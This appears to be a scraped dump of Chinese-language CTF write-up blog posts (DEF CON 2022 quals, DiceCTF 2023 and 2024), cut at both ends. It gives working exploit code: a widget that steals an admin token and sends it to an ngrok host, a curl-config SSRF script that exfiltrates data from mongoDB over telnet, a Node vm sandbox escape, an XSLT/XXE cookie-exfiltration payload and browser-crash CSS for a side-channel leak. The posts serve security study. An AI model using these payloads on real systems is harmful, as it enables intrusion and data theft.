text: data.author.user, style: &#123; color: 4278230474 &#125; &#125;)] &#125;), Padding(&#123; padding: [0.0, 5.0, 0.0, 0.0], child: Text(&#123; text: data.data.title &#125;) &#125;), switch state.loaded &#123; true: Column(&#123; children: [... for loop in data.poll_options: Row(&#123; children: [Padding(&#123; child: ElevatedButton(&#123; child: Text(&#123; text: loop0.text &#125;), onPressed: event api_post &#123; path: data.data.apiVote, body: &#123; selection: loop0.text &#125; &#125; &#125;), padding: [0.0, 5.0, 10.0, 0.0] &#125;), Text(&#123; text: loop0.count &#125;)] &#125;), TextButton(&#123; child: Text(&#123; text: Refresh, style: &#123; color: 4294942366 &#125; &#125;), onPressed: set state.loaded = false &#125;) ] &#125;), null: ApiMapper(&#123; url: data.data.apiGet, jsonKey: options, dataKey: poll_options, onLoaded: set state.loaded = true &#125;) &#125; ] &#125;) &#125;); 最底下那個 ApiMapper 是關鍵，看起來可以發 API，雖然還不知道發 API 可以幹嘛，但先嘗試看看就對了。 接著我就想辦法在 local 看能不能重新 build 出一樣的 widget，結果怎麼跑都有錯，花了一堆時間。 21:11(3h 31m) 找到正確的 build 法經過各式各樣的嘗試之後，我發現在遠端的檔案中有一個 local 的字，但是在本機想重現時，build 出來卻沒有。於是我猜測會不會是前面有個 import local，結果還真的是這樣。 此時終於試出來應該要怎樣才能 build 出一個能用 ApiMapper 的 widget。 import core.widgets; import core.material; import local; widget root = Container( child: Column( children: [ Row( children: [ Text( text: 'pewpew' ), Expanded( child: Text( text: data.author.user, style: &#123; color: 4278230474 &#125; ) ) ] ), Row( children: [ ApiMapper( url: \"@example.ngrok.io/json\", jsonKey: \"a\", dataKey: \"a\", onLoaded: set state.abc = 'abc' ) ] ) ] ) ); 不過做到這步以後又卡關了，因為 ApiMapper 只能送 GET request，沒有辦法 POST，從 source code 裡面也可以證明這點： 21:30(3h 50m) 有其他隊伍解開了本來想拿 first blood 的，技不如人只好QQ 此時我還在研究 source code，無論是題目的還是 rfw 的都有看一下，看能不能找到更多線索。 21:43(4h 03m) 找到其他關鍵我跟隊友都發現了在 poll widget 裡面有個 event api_post，可以拿來送出 POST request，不過觸發的方式不太確定，要試試看。 22:22(4h 42m) 成功觸發 event隊友成功找到了觸發方式： Row( children: [ ApiMapper( url: \"@example.ngrok.io/json\", jsonKey: \"a\", dataKey: \"a\", onLoaded: event \"api_post\" &#123; path: \"@example.ngrok.io/test\", body: \"bodytest\" &#125; ) ] ) 我自己其實也有試過一樣的方法，但不知道為什麼沒有成功。 雖然可以發 POST request，可是我們拿不到 response，所以似乎也沒什麼用處。此時又在這邊卡了一陣子。 而我覺得我們應該有忽略什麼重要的細節，才會卡在這邊，不然怎麼看這一步都應該快到結尾了。於是我重新回去玩了一遍 app，看一下有沒有什麼遺漏的地方。 22:56(5h 16m) 重回正軌，開始實作 exploit重新玩了一遍之後果真發現有地方沒注意到，那就是有一個 GET 的 API 是 /api/token 可以拿到 token 資料，而用 ApiMapper 拿回來的資料會存在 data 裡面，所以可以先用 ApiMapper 拿資料，接著再用 event &quot;api_post&quot; 把拿到的資料送出去，就可以獲得 admin token。 概念不難，但難的是實作。在這邊花了一點時間跟隊友分享了一下這個思路，想說大家一起來寫會比較快。 嘗試的過程中發現如果是 ApiMapper 的 onloaded 直接接 event &quot;api_post&quot; 的話，好像會拿不到資料，所以需要找其他種方式。這時候就想到了 poll 中出現的 switch，應該可以用那一招來做。 話說學習 rfw 的方式是直接看 code，其實註解跟測試寫得都滿詳細的，比文件的資料多很多：https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/text.dart#L479 23:19(5h 39m) 失敗的 exploit我寫了一個我自己覺得怎麼看都會成功的 widget： widget root &#123; loaded: 1 &#125; = Container( child: Column( children: [ Row( children: [ Text( text: \"test\" ), switch state.loaded &#123; 2: ApiMapper( url: \"@example.ngrok.io/json\", jsonKey: \"a\", dataKey: \"b\", onLoaded: event \"api_post\" &#123; path: \"@example.ngrok.io/send\", body: &#123; \"token\": data.new_token &#125; &#125;, ), 1: ApiMapper( url: \"/api/token\", jsonKey: \"new_token\", dataKey: \"new_token\", onLoaded: set state.loaded = 2, ), default: Text( text: 'yo' ) &#125; ] ) ] ) ); 但不知道為什麼失敗了，第二個 request 發不出去，只好繼續嘗試其他做法。 23:25(5h 45m) 解開囉 🎉最後是用這樣： import core.widgets; import core.material; import local; widget root &#123; loaded: 1 &#125; = Container( child: Column( children: [ Row( children: [ Text( text: \"test\" ), ApiMapper( url: \"@example.ngrok.io/json\", jsonKey: \"a\", dataKey: \"b\", onLoaded: event \"api_post\" &#123; path: \"@example.ngrok.io/send\", body: &#123; \"token\": data.new_token &#125; &#125;, ), switch state.loaded &#123; 1: ApiMapper( url: \"/api/token\", jsonKey: \"new_token\", dataKey: \"new_token\", onLoaded: set state.loaded = 2, ), default: Text( text: 'yo' ) &#125; ] ) ] ) ); 那個 switch 沒功用，拿掉也沒差，只是因為拿之前的改懶得刪而已。 總之概念就是我們可以同時用兩個 ApiMapper，第一個發到我們 server 的讓它先等個 3 秒，如此一來在 onLoaded 觸發時，拿 token 的那個 response 已經回來了，於是 data.new_token 就是 token，就會送到我們的 server 來。 總結最後，總結一下這題的解法： 觀察 App，得出可以載入自訂 widget 學習如何產生合法的 widget 觀察現有的 remote widget，得知有 ApiMapper 跟 api_post 這兩個東西 觀察 App，發現有 /api/token 可以拿 token 並且拿到 response 寫一個 widget 能夠先用 ApiMapper 拿 token，再用 api_post 送出 這就是我在開頭所說的，這題難度不高，考的是基本功，而我所謂的基本功指的是： 觀察力：你要能觀察出這題有用 rfw，並且觀察出現有機制是如何運作，包含 /api/token、/api/flag、各種現成 widget 的邏輯 學習新東西的能力：要快速學習 rfw 的 dart 基本語法 寫 code 的能力：要做出一個能動的 widget，並且使用現有機制讓它動起來 這題的概念不難，而花時間的點在於對 flutter&#x2F;dart&#x2F;rfw 不熟，所以中間會一直出一些語法錯誤或是不知道為什麼就是跑不起來的狀況。 而自我檢討的話，大概就是一開始找錯方向，應該再觀察一陣子的。例如說如果在開頭就把 poll 的 widget 也 decode 並且仔細觀察，搞不好可以省不少時間。 話說這次跟了隊伍打了資格賽以後，最大的體悟大概就是如果想要真心享受 DEF CON CTF 的話，還是必須要有基本的 binary 相關知識。我覺得不需要到很強，但至少基本的知識要有（例如說能解出其他 CTF 中很簡單的 pwn 跟 reverse 題？），這樣才比較知道隊友在幹嘛，才能更有參與感。 像我這樣什麼都不會的話，我自己是覺得有點可惜。這感覺大概就好像是，你至少要玩過一點 LOL，看比賽才會知道在幹嘛，才會知道哪邊好看。如果沒玩過的話，基本上是看不懂的，看到玩家開了一個神大絕也沒反應。","link":"/2022/06/02/defcon-2022-qual-writeup/"},{"title":"DiceCTF 2023 筆記","text":"雖然過了快兩個月，但還是來補一下筆記。去年被電得很慘，原本想說過一年了，今年應該會比較好吧，沒想到還是被電爛。 關鍵字： SSRF mongoDB via telnet protocol jetty cookie parser ASI (Automatic Semicolon Insertion) VM sandbox escape via Proxy process.binding 瀏覽器的 XSLT + XXE 開頭先貼一下官方的 repo，裡面有程式碼跟解答：https://github.com/dicegang/dicectf-2023-challenges Web - codebox (30 solves)這次唯一有解開的一題，還滿有趣的 後端很簡單，就一個會根據 code 的參數調整 CSP 的功能，可以達成 CSP injection： const fastify = require('fastify')(); const HTMLParser = require('node-html-parser'); const box = require('fs').readFileSync('box.html', 'utf-8'); fastify.get('/', (req, res) => &#123; const code = req.query.code; const images = []; if (code) &#123; const parsed = HTMLParser.parse(code); for (let img of parsed.getElementsByTagName('img')) &#123; let src = img.getAttribute('src'); if (src) &#123; images.push(src); &#125; &#125; &#125; const csp = [ \"default-src 'none'\", \"style-src 'unsafe-inline'\", \"script-src 'unsafe-inline'\", ]; if (images.length) &#123; csp.push(`img-src $&#123;images.join(' ')&#125;`); &#125; res.header('Content-Security-Policy', csp.join('; ')); res.type('text/html'); return res.send(box); &#125;); fastify.listen(&#123; host: '0.0.0.0', port: 8080 &#125;); 而前端則是長這樣，會把你提供的 code 放到 sandbox iframe 裡面去： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;title>codebox&lt;/title> &lt;meta charset=\"UTF-8\" /> &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1\" /> &lt;style> * &#123; margin: 0; font-family: monospace; line-height: 1.5em; &#125; div &#123; margin: auto; width: 80%; padding: 20px; &#125; textarea &#123; width: 100%; height: 200px; max-width: 500px; &#125; iframe &#123; border: 1px solid lightgray; &#125; &lt;/style> &lt;/head> &lt;body> &lt;div id=\"content\"> &lt;h1>codebox&lt;/h1> &lt;p>Codebox lets you test your own HTML in a sandbox!&lt;/p> &lt;br> &lt;form action=\"/\" method=\"GET\"> &lt;textarea name=\"code\" id=\"code\">&lt;/textarea> &lt;br>&lt;br> &lt;button>Create&lt;/button> &lt;/form> &lt;br> &lt;br> &lt;/div> &lt;div id=\"flag\">&lt;/div> &lt;/body> &lt;script> const code = new URL(window.location.href).searchParams.get('code'); if (code) &#123; const frame = document.createElement('iframe'); frame.srcdoc = code; frame.sandbox = ''; frame.width = '100%'; document.getElementById('content').appendChild(frame); document.getElementById('code').value = code; &#125; const flag = localStorage.getItem('flag') ?? \"flag&#123;test_flag&#125;\"; document.getElementById('flag').innerHTML = `&lt;h1>$&#123;flag&#125;&lt;/h1>`; &lt;/script> &lt;/html> 這題有趣的點在於一開始你會以為它讓你可以改 CSP，是讓你用 sandbox 這個 CSP 規則去做一些事情，然後你就可以跳出 sandbox 之類的，但嘗試過後你會發現沒辦法。 正解其實是用 require-trusted-types-for &#39;script&#39;; 來讓 document.getElementById(&#39;flag&#39;).innerHTML = flag; 這段被擋下來，再搭配 report-uri https://vps 來回報被擋下來的內容，就可以拿到 flag。 還有另一個小地方是 frame.sandbox = &#39;&#39;; 這段也是歸 require-trusted-types-for 管，所以這段會先出錯，因此這段也要跳過。 跳過的方法很簡單，前端的 searchParams.get() 如果你有多個 param，吃的會是第一個參數，而後端如果有多個會變成 array，所以傳 ?code=&amp;code=payload 就可以讓前後端看到的內容不一樣，前端就會認為是空的，跳過那一段。 Web - unfinished (14 solves)這題的核心程式碼在這： app.post(\"/api/ping\", requiresLogin, (req, res) => &#123; let &#123; url &#125; = req.body; if (!url || typeof url !== \"string\") &#123; return res.json(&#123; success: false, message: \"Invalid URL\" &#125;); &#125; try &#123; let parsed = new URL(url); if (![\"http:\", \"https:\"].includes(parsed.protocol)) throw new Error(\"Invalid URL\"); &#125; catch (e) &#123; return res.json(&#123; success: false, message: e.message &#125;); &#125; const args = [ url ]; let &#123; opt, data &#125; = req.body; if (opt &amp;&amp; data &amp;&amp; typeof opt === \"string\" &amp;&amp; typeof data === \"string\") &#123; if (!/^-[A-Za-z]$/.test(opt)) &#123; return res.json(&#123; success: false, message: \"Invalid option\" &#125;); &#125; // if -d option or if GET / POST switch if (opt === \"-d\" || [\"GET\", \"POST\"].includes(data)) &#123; args.push(opt, data); &#125; &#125; cp.spawn('curl', args, &#123; timeout: 2000, cwd: \"/tmp\" &#125;).on('close', (code) => &#123; // TODO: save result to database res.json(&#123; success: true, message: `The site is $&#123;code === 0 ? 'up' : 'down'&#125;` &#125;); &#125;); &#125;); 你可以傳入一個 URL 跟 option 來讓它執行 cURL，其中對於參數的檢查可以用 config 繞過，先用 -o 下載 config 並存到一個叫做 GET 的檔案，然後再用 -K 來使用 config，像這樣： import requests import time host = 'https://unfinished-27df3c439f8d6dd1.mc.ax' hook_url = 'https://webhook.site/576f330a-c867-4609-b83f-36bbca32abfe' config_url = 'https://gist.githubusercontent.com/aszx87410/a0a710f8bcc351958d107924632888c9/raw/54673c647da2ea04e90a1c67c7a40eb7e99320f6/test.txt' def send_command(url, opt=\"\", data=\"\"): if opt == \"\": req_data = &#123; \"url\": url &#125; else: req_data = &#123; \"url\": url, \"opt\": opt, \"data\": data &#125; resp = requests.post(host + \"/api/ping\", data=req_data) print(resp.status_code) send_command(hook_url) time.sleep(5) # need to wait for server restart send_command(config_url, \"-o\", \"GET\") time.sleep(5) send_command(hook_url, \"-K\", \"GET\") time.sleep(5) 但這是最簡單的部分，最難的部分是 flag 存在 mongoDB 裡面，所以你要想辦法用 cURL 去 SSRF mongoDB。 喔對了，這題不能用 gopher，因為 gopher 被禁用了。 比賽的時候沒想到怎麼弄，弄不出來，賽後看了其他人的解法，可以用 telnet 來做(source: https://discord.com/channels/805956008665022475/805962699246534677/1071901986338897982)： import requests import time url = 'https://unfinished-9044.mc.ax' with open('raw_packet.txt', 'wb') as fout: fout.write(b'\\x92\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xdd\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7d\\x00\\x00\\x00\\x02\\x66\\x69\\x6e\\x64\\x00\\x05\\x00\\x00\\x00\\x66\\x6c\\x61\\x67\\x00\\x03\\x66\\x69\\x6c\\x74\\x65\\x72\\x00\\x05\\x00\\x00\\x00\\x00\\x10\\x6c\\x69\\x6d\\x69\\x74\\x00\\x01\\x00\\x00\\x00\\x08\\x73\\x69\\x6e\\x67\\x6c\\x65\\x42\\x61\\x74\\x63\\x68\\x00\\x01\\x10\\x62\\x61\\x74\\x63\\x68\\x53\\x69\\x7a\\x65\\x00\\x01\\x00\\x00\\x00\\x03\\x6c\\x73\\x69\\x64\\x00\\x1e\\x00\\x00\\x00\\x05\\x69\\x64\\x00\\x10\\x00\\x00\\x00\\x04\\xce\\x2d\\x77\\x58\\x58\\xfd\\x41\\xc2\\x98\\xf9') print('upload packet contents') res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://[...]/raw_packet.txt', 'opt': '-o', 'data': 'GET', &#125;) assert res.status_code == 200 time.sleep(5) print('upload curl config') with open('curl.config', 'wb') as fout: fout.write((\"\"\" next url=\"telnet://mongodb:27017\" upload-file=\"GET\" output=\"flag.txt\" no-buffer \"\"\").strip().encode()) res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://[...]/curl.config', 'opt': '-o', 'data': 'POST', &#125;) assert res.status_code == 200 time.sleep(5) print('download flag') try: res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://google.com/', 'opt': '-K', 'data': 'POST', &#125;) assert res.status_code == 200 except: pass time.sleep(10) print('upload exfil config') with open('curl.config', 'wb') as fout: fout.write((\"\"\" next url=\"telnet://[...]:1337\" upload-file=\"flag.txt\" \"\"\").strip().encode()) res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://[...]/curl.config', 'opt': '-o', 'data': 'POST', &#125;) assert res.status_code == 200 time.sleep(5) print('exfil') try: res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://google.com/', 'opt': '-K', 'data': 'POST', &#125;) assert res.status_code == 200 except: pass 然後還有一個非預期解，就是用 cURL 下載檔案蓋掉 node_modules 裡的東西，這樣 server 再次啟動時就會載入你寫的 JS，然後就輕鬆拿到 flag 了。 Web - jnotes (6 solves)這題是一個 Java web： package dev.arxenix; import java.net.URLDecoder; import java.net.URLEncoder; import java.nio.charset.StandardCharsets; import io.javalin.Javalin; import io.javalin.http.Context; import io.javalin.http.Cookie; public class App &#123; public static String DEFAULT_NOTE = \"Hello world!\\r\\nThis is a simple note-taking app.\"; public static String getNote(Context ctx) &#123; var note = ctx.cookie(\"note\"); if (note == null) &#123; setNote(ctx, DEFAULT_NOTE); return DEFAULT_NOTE; &#125; return URLDecoder.decode(note, StandardCharsets.UTF_8); &#125; public static void setNote(Context ctx, String note) &#123; note = URLEncoder.encode(note, StandardCharsets.UTF_8); ctx.cookie(new Cookie(\"note\", note, \"/\", -1, false, 0, true)); &#125; public static void main(String[] args) &#123; var app = Javalin.create(); app.get(\"/\", ctx -> &#123; var note = getNote(ctx); ctx.html(\"\"\" &lt;html> &lt;head>&lt;/head> &lt;body> &lt;h1>jnotes&lt;/h1> &lt;form method=\"post\" action=\"create\"> &lt;textarea rows=\"20\" cols=\"50\" name=\"note\"> %s &lt;/textarea> &lt;br> &lt;button type=\"submit\">Save notes&lt;/button> &lt;/form> &lt;hr style=\"margin-top: 10em\"> &lt;footer> &lt;i>see something unusual on our site? report it &lt;a href=\"https://adminbot.mc.ax/web-jnotes\">here&lt;/a>&lt;/i> &lt;/footer> &lt;/body> &lt;/html>\"\"\".formatted(note)); &#125;); app.post(\"/create\", ctx -> &#123; var note = ctx.formParam(\"note\"); setNote(ctx, note); ctx.redirect(\"/\"); &#125;); app.start(1337); &#125; &#125; 雖然說你有個 free XSS，但是 cookie 是 httponly 的，所以你也讀不到。 解法是利用 jetty 奇怪的 cookie parse 行為，如果 cookie 的內容有 &quot;，那它會讀到下一個 &quot; 為止。 例如說如果有三個 cookie： note&#x3D;”a flag&#x3D;dice{flag} end&#x3D;b” 送出的 header 是：note=&quot;a; flag=dice&#123;flag&#125;; end=b&quot;，最後會被 parse 成一個 note 的 cookie，而不是預期的三個 cookie。 所以重點就是創造出這些 cookie 然後讓瀏覽器用我們想要的順序送出。 Chrome 送 cookie 的順序是 path 最長的先，再來是最近更新的，因此只要這樣就好： document.cookie = `note=\"a; path=//`; // use double slash path to get it to appear at start (longest path) document.cookie = `end=ok;\"`; // last cookie (most recently updated) w = window.open('https://jnotes.mc.ax//') 就可以讓 flag 反映在頁面上，進而拿到 flag。 Web - gift (4 solves)這題沒仔細看，賽後也還沒研究，只知道有個部分跟 ASI (Automatic Semicolon Insertion) 有關，你看起來是 A，但實際結果是 B，因為 JS 插入分號的機制所導致。 以前也有過類似的題目，滿有趣的，但如果只用肉眼看確實滿難看出來，看來我要再練練了。 Web - jwtjail (3 solves)這題真是飲恨啊，該找的都找了，lib 的原始碼我也看過好幾遍了，最後還是沒有做出來，差一點。 程式碼長這樣： const jwt = require(\"jsonwebtoken\"); const express = require(\"express\"); const vm = require(\"vm\"); const app = express(); const PORT = process.env.PORT || 12345; app.use(express.urlencoded(&#123; extended: false &#125;)); const ctx = &#123; codeGeneration: &#123; strings: false, wasm: false &#125;&#125;; const unserialize = (data) => new vm.Script(`\"use strict\"; ($&#123;data&#125;)`).runInContext(vm.createContext(Object.create(null), ctx), &#123; timeout: 250 &#125;); process.mainModule = null; // 🙃 app.use(express.static(\"public\")); app.post(\"/api/verify\", (req, res) => &#123; let &#123; token, secretOrPrivateKey &#125; = req.body; try &#123; token = unserialize(token); secretOrPrivateKey = unserialize(secretOrPrivateKey); res.json(&#123; success: true, data: jwt.verify(token, secretOrPrivateKey) &#125;); &#125; catch &#123; res.json(&#123; success: false, data: \"Verification failed\" &#125;); &#125; &#125;); app.listen(PORT, () => console.log(`web/jwtjail listening on port $&#123;PORT&#125;`)); 靠著 vm 把你丟進去的 data 放在另一個 context，然後呼叫 jwt lib，因此目的就是在 jwt lib 處理的過程中找到可以 escape 的地方。 而解法是我們可以幫一個 function 加上 proxy，如果呼叫到 function，就會先呼叫到 proxy 的 apply var p = new Proxy(_ => _, &#123; apply(target, thisArg, argumentsList) &#123; console.log('apply') &#125; &#125;) p() // apply 而這個 apply 的第三個參數 argumentsList 是來自外界的 object，就可以靠著這個參數來逃出 VM。 除此之外，雖然 process.mainModule 被刪掉了，但可以用 process.binding(&quot;spawn_sync&quot;) 來達成執行程式碼。 一個簡單的 PoC 像這樣： \"use strict\"; const vm = require(\"vm\"); const ctx = &#123; codeGeneration: &#123; strings: false, wasm: false &#125;&#125;; const unserialize = (data) => new vm.Script(`\"use strict\"; ($&#123;data&#125;)`) .runInContext( vm.createContext(Object.create(&#123;console&#125;), ctx), &#123; timeout: 250 &#125; ); var data = `&#123; key: &#123; toString: new Proxy(_ => _, &#123; apply(a, b, c) &#123; console.log(c.constructor.constructor(\"return this\")().process.pid) &#125; &#125;) &#125; &#125;` try &#123; data = unserialize(data); console.log(data['key'].toString()) &#125; catch(err) &#123; console.log(err) &#125; 而賽後的 Discord 討論裡面，也有人提到可以利用雙重 proxy 達成「只要存取 object 的值就可以 escape」，像這樣： \"use strict\"; const vm = require(\"vm\"); const ctx = &#123; codeGeneration: &#123; strings: false, wasm: false &#125;&#125;; const unserialize = (data) => new vm.Script(`\"use strict\"; ($&#123;data&#125;)`) .runInContext( vm.createContext(Object.create(&#123;console&#125;), ctx), &#123; timeout: 250 &#125; ); var data = `new Proxy(&#123;&#125;, &#123; get: new Proxy(_=>_, &#123; apply(a,b,c) &#123; console.log(c.constructor.constructor(\"return this\")().process.pid) &#125; &#125;) &#125;)` try &#123; data = unserialize(data); data['key']; &#125; catch(err) &#123; console.log(err) &#125; 作者 writeup：https://brycec.me/posts/dicectf_2023_challenges Web - impossible XSS (0 solves)這題很酷，程式碼很簡單： const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/', (req, res) => &#123; // free xss, how hard could it be? res.end(req.query?.xss ?? 'welcome to impossible-xss'); &#125;); app.get('/flag', (req, res) => &#123; // flag in admin bot's FLAG cookie res.end(req.cookies?.FLAG ?? 'dice&#123;fakeflag&#125;'); &#125;); app.listen(8080); 你有一個 free xss，但是在 admin bot 裡面有一行 await page.setJavaScriptEnabled(false);，直接把 JS 關掉。 解法是用 XSLT 加上 XXE，像這樣： ss = `&lt;?xml version=\"1.0\"?> &lt;!DOCTYPE a [ &lt;!ENTITY xxe SYSTEM \"https://impossible-xss.mc.ax/flag\" >]> &lt;xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\"> &lt;xsl:template match=\"/asdf\"> &lt;HTML> &lt;HEAD> &lt;TITLE>&lt;/TITLE> &lt;/HEAD> &lt;BODY> &lt;img> &lt;xsl:attribute name=\"src\"> https://hc.lc/log2.php?&amp;xxe; &lt;/xsl:attribute> &lt;/img> &lt;/BODY> &lt;/HTML> &lt;/xsl:template> &lt;/xsl:stylesheet>` xml=`&lt;?xml version=\"1.0\"?> &lt;?xml-stylesheet type=\"text/xsl\" href=\"data:text/plain;base64,$&#123;btoa(ss)&#125;\"?> &lt;asdf>&lt;/asdf>` payload=encodeURIComponent(xml) 作者的 writeup：https://blog.ankursundara.com/dicectf23-writeups/","link":"/2023/03/26/dicectf-2023-writeup/"},{"title":"DiceCTF 2024 筆記","text":"相比於去年跟前年，今年的 web 題難度有顯著降低了不少，變得更平易近人了，靠著隊友的努力拿下了第一名，而 web 題也只剩一題沒解出來。 這次我基本上只解了簡單的 funnylogin 跟難的 safestlist，其他都是隊友解開的，還有另一題 another-csp 有看了一下，因此這篇只會記我有看過的以及比較難的題目。 如果想看其他題，可以參考其他人的 writeup： st98 - DiceCTF 2024 Quals writeup 0xOne - 2024 Dice CTF Write up [Web] 官方提供的所有題目原始碼：https://github.com/dicegang/dicectf-quals-2024-challenges 關鍵字列表： crash chromium slower css style xsleak URL length limit service worker background fetch connection pool + css injection iframe width + css inection web&#x2F;another-csp (16 solves)這題的程式碼滿簡單的，簡化過後如下： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> &lt;title>another-csp&lt;/title> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'\"> &lt;/head> &lt;body> &lt;iframe id=\"sandbox\" name=\"sandbox\" sandbox>&lt;/iframe> &lt;/body> &lt;script> document.getElementById('form').onsubmit = e => &#123; e.preventDefault(); const code = document.getElementById('code').value; const token = localStorage.getItem('token') ?? '0'.repeat(6); const content = `&lt;h1 data-token=\"$&#123;token&#125;\">$&#123;token&#125;&lt;/h1>$&#123;code&#125;`; document.getElementById('sandbox').srcdoc = content; &#125; &lt;/script> &lt;/html> 你可以插入任意程式碼到 iframe 裡面，目標是偷到相同網頁下的 token。 而重點是 iframe 的 sandbox 全開，CSP 也封鎖得很死。從這兩個線索中，可以得出限制是： defeault-src &#39;none&#39;，所以禁止引入任何外部資源 sandbox，因此不能執行任何 JavaScript，也無法透過 meta 重新導向 少了 JavaScript 以後，就少很多攻擊面了，因此只能從 HTML 與 CSS 下手。這一題的 CSS 有開 unsafe-inline，所以是可以加上 CSS 的。 不過無論如何，看起來都沒辦法對外發送 request，因此要嘛是找到 bypass（例如說 dns prefetch，但這題應該也不適用），要嘛就是要搭配題目的其他部分。 這一題的 bot 的運作方式不太一樣： import &#123; createServer &#125; from 'http'; import &#123; readFileSync &#125; from 'fs'; import &#123; spawn &#125; from 'child_process' import &#123; randomInt &#125; from 'crypto'; const sleep = timeout => new Promise(resolve => setTimeout(resolve, timeout)); const wait = child => new Promise(resolve => child.on('exit', resolve)); const index = readFileSync('index.html', 'utf-8'); let token = randomInt(2 ** 24).toString(16).padStart(6, '0'); let browserOpen = false; const visit = async code => &#123; browserOpen = true; const proc = spawn('node', ['visit.js', token, code], &#123; detached: true &#125;); await Promise.race([ wait(proc), sleep(10000) ]); if (proc.exitCode === null) &#123; process.kill(-proc.pid); &#125; browserOpen = false; &#125; createServer(async (req, res) => &#123; const url = new URL(req.url, 'http://localhost/'); if (url.pathname === '/') &#123; return res.end(index); &#125; else if (url.pathname === '/bot') &#123; if (browserOpen) return res.end('already open!'); const code = url.searchParams.get('code'); if (!code || code.length > 1000) return res.end('no'); visit(code); return res.end('visiting'); &#125; else if (url.pathname === '/flag') &#123; if (url.searchParams.get('token') !== token) &#123; res.end('wrong'); await sleep(1000); process.exit(0); &#125; return res.end(process.env.FLAG ?? 'dice&#123;flag&#125;'); &#125; return res.end(); &#125;).listen(8080); 如果 browserOpen 的話，可以從 response 中得知。因此看到題目後我就有個想法，如果讓 Chromium crash 會發生什麼事？是不是可以透過這個方式來 leak 出 token？ 舉例來說，假如我們寫一條 CSS 是 h1[data-token^=&quot;0&quot;] &#123; /*crash*/ &#125;，來讓 Chromium crash，那或許就可以加快或是拖慢 bot 執行的時間，進而得知這個 selector 是否符合。 後來是隊友從 Chromium issues 中找到了讓 Chromium crash 的方式： &lt;style> h1[data-token^=\"a\"] &#123; --c1: color-mix(in srgb, blue 50%, red); --c2: srgb(from var(--c1) r g b); background-color: var(--c2); &#125; &lt;/style> 在賽後討論中也看到 Discord 內有人貼了 payload，讓網頁載入變得超級慢，也可以達到類似的效果，這是 @Trixter 貼的： &lt;style> html:has([data-token^=\"a\"]) &#123; --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1); --b: var(--a),var(--a),var(--a),var(--a),var(--a); --c: var(--b),var(--b),var(--b),var(--b),var(--b); --d: var(--c),var(--c),var(--c),var(--c),var(--c); --e: var(--d),var(--d),var(--d),var(--d),var(--d); --f: var(--e),var(--e),var(--e),var(--e),var(--e); &#125; &lt;/style> &lt;style> *&#123; background-image: var(--f) &#125; &lt;/style> 有點像是 Billion laughs attack 那樣，透過不斷重複構造出一個超大 payload，就可以拖慢速度。 拖慢速度以後就可以用剛剛講過的方式去測量網頁載入所需要的時間，因為超過 10 秒的話會直接 timeout，藉由這點來 leak 出 flag。 web&#x2F;safestlist (2 solves)這題是修改自之前我有解過的一個題目：SekaiCTF 2022 筆記與 concurrent limit，我簡單描述一下修改後的版本。 這個題目是一個經典的 note app，你可以建立新的 note，但問題是 note 內容會先經過 DOMPurify.sanitize，所以沒辦法 XSS。而 CSP 的部分是 default-src &#39;self&#39;，只能往題目的 origin 發送請求。 也就是說，你沒辦法把請求往外傳。 除了建立 note 以外，還可以刪除 note，是用 note 的 index 來刪的。 而這題的核心是這一段建立 note 的程式碼： fastify.post(\"/create\", (req, reply) => &#123; const &#123; text &#125; = req.body; if (!text || typeof text !== \"string\") &#123; return reply.type(\"text/html\").send(\"Missing text\"); &#125; const userNotes = notes.get(req.cookies.id) ?? []; const totalLen = userNotes.reduce((prev, curr) => prev + curr.length, 0); const newLen = totalLen + text.length; if (newLen > 16384) &#123; return reply.redirect(`/?message=Cannot add, please delete some notes first ($&#123;newLen&#125; > 16384 chars)`); &#125; userNotes.push(text); userNotes.sort(); notes.set(req.cookies.id, userNotes); reply.redirect(\"/?message=Note added successfully\"); &#125;); 注意那個 userNotes.sort();，會根據 note 的內容進行排序。flag 的格式是 dice&#123;[a-z]+&#125;，利用這個排序功能，可以得出一個簡單的策略。 假設 flag 是 dice&#123;c&#125;，而我們先建立了一個 dice&#123;a 的 note，建立完以後去刪除第一個 note，這時候 dice&#123;a 會被刪掉，留下 flag dice&#123;c&#125;。 若是我們先建立了 dice&#123;d 的 note，再去刪除第一個，就換成 dice&#123;c&#125; 被刪掉，留下剛剛建立的 dice&#123;d。 換句話說，建立 note 以後再刪除第一個 note，根據排序的不同，留下來的 note 也不同。 如果我可以知道最後留下來的 note 是什麼，就能反過來推測出 flag 的順序。如果留下來的是我建立的 note，代表 flag 一定排在前面，字典序也在前面。 因此這題的重點就是，該怎麼知道留下來的 note 是哪一個？ 根據去年的解法，我一開始的想法一樣是讓 server side busy。Node.js 是 single thread，所以在處理完一個請求之前，是沒辦法接收其他請求的（非同步則是另外一回事）。 所以我的想法是建立一個 note，裡面有一堆 &lt;img src=/?&#123;random_number&#125;&gt;，在字數限制內大概可以發送 700~1000 個請求左右，藉由發一堆請求給 server，讓 server 變得忙碌。 這題還有另一點不同，那就是 bot： const visit = async (url) => &#123; // clear all data await fsp.rm(tmpDir, &#123; recursive: true, force: true &#125;); let browser; try &#123; browser = await launchBrowser(); let page = await browser.newPage(); // set flag await page.goto(\"http://localhost:3000\", &#123; timeout: 7500, waitUntil: \"networkidle2\" &#125;); await sleep(2000); await page.evaluate((flag) => &#123; document.querySelector(\"input[type=text]\").value = flag; document.querySelector(\"form[action='/create']\").submit(); &#125;, FLAG); await page.waitForNavigation(&#123; waitUntil: \"networkidle2\" &#125;); // restart browser, which should close all windows await browser.close(); browser = await launchBrowser(); page = await browser.newPage(); // go to the submitted site await page.goto(url, 